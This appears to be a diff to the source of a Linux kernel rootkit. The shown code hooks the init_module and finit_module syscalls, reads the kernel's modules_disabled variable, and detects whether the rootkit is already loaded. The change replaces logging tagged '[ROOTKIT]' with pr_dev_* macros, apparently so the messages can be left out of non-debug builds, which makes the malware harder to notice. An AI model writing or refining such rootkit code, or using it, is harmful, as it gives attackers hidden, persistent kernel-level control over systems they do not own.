@@ -81,12 +81,11 @@ static inline int may_init_module(void)
         p_modules_disabled = (int *)lookup_name("modules_disabled");
 
         IF_U (p_modules_disabled == NULL) {
-            pr_err("[ROOTKIT] * Failed to find the `modules_disabled` variable\n");
+            pr_dev_err("* Failed to find the `modules_disabled` variable\n");
             return -EFAULT;
         }
 
-        pr_info("[ROOTKIT] * modules_disabled: *%p = %d\n", p_modules_disabled,
-                *p_modules_disabled);
+        pr_dev_info("* modules_disabled: *%p = %d\n", p_modules_disabled, *p_modules_disabled);
     }
 
     if (!capable(CAP_SYS_MODULE) || *p_modules_disabled) {
@@ -101,7 +100,7 @@ static long do_check_module(const sysfun_t orig_func, struct pt_regs *const p_re
 {
     IF_U (strnstr(p_buf->p_data, "alias=" MOD_ALIAS,
                   min_t(size_t, p_buf->sz_len, MAX_SEARCH_LEN)) != NULL) {
-        pr_warn("[ROOTKIT] * The rootkit is already loaded, aborting\n");
+        pr_dev_warn("* The rootkit is already loaded, aborting\n");
         vfree(p_buf->p_data);
         return -EEXIST;
     }
@@ -119,7 +118,7 @@ SYSCALL_HOOK_HANDLER3(init_module, orig_init_module, p_regs, void __user *, p_um
     buffer_t p_buf;
     struct load_info info = {};
 
-    pr_info("[ROOTKIT] init_module(%p, %lu, %p)\n", p_umod, ui64_len, s_uargs);
+    pr_dev_info("init_module(%p, %lu, %p)\n", p_umod, ui64_len, s_uargs);
 
     i32_err = may_init_module();
     if (i32_err != 0) {
@@ -144,7 +143,7 @@ SYSCALL_HOOK_HANDLER3(finit_module, orig_finit_module, p_regs, int, i32_fd, cons
     int i32_err = 0;
     buffer_t p_buf;
 
-    pr_info("[ROOTKIT] finit_module(%d, %p, %s%#x)\n", i32_fd, s_uargs, SIGNED_ARG(i32_flags));
+    pr_dev_info("finit_module(%d, %p, %s%#x)\n", i32_fd, s_uargs, SIGNED_ARG(i32_flags));
 
     i32_err = may_init_module();
     if (i32_err != 0) {
